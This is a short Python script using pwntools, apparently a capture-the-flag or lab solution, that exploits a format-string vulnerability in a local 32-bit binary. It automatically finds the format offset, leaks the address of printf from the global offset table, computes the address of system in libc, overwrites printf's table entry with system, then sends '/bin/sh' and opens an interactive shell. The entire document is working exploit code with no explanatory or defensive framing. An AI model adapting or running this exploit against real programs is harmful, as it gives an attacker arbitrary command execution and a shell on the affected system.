from pwn import *

elf = ELF('../target/test')
io = process('../target/test')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def exec_fmt(payload):
    io.sendline(payload)
    info = io.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset

printf_got = elf.got['printf']
payload = p32(printf_got)+'%{}$s'.format(offset).encode()
io.send(payload)
printf_addr = u32(io.recv()[4:8])
system_addr = printf_addr-(libc.symbols['printf']-libc.symbols['system'])
log.info("system_addr=>%s"%hex(system_addr))

payload = fmtstr_payload(offset,{printf_got:system_addr})
io.send(payload)
io.send('/bin/sh')
io.recv()
io.interactive()